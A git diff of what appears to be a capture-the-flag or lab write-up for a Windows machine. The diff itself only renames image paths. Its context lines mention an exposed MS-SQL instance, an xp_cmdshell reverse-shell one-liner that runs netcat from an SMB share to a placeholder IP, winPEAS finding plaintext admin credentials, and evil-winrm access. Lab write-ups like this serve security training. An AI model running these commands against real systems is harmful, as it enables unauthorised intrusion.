@@ -4,7 +4,7 @@
 
 Nmap scan:
 
-<figure><img src="../../../.gitbook/assets/image (2) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (4) (2).png" alt=""><figcaption></figcaption></figure>
 
 Interesting that there was a MS-SQL instance publicly open.
 
@@ -52,7 +52,7 @@ xp_cmdshell "\\<IP>\share\nc64.exe -e cmd <IP> 4444"
 
 Now that we're in the machine, I ran winPEAS to enumerate possible escalation vectors. Funnily, it found the Administrator credentials in plaintext within the machine.
 
-<figure><img src="../../../.gitbook/assets/image (7) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (4) (3).png" alt=""><figcaption></figcaption></figure>
 
 Earlier, Nmap detected that port 5985 for WinRM was open. As such, we can use `evil-winrm` to gain a shell as the administrator.
 
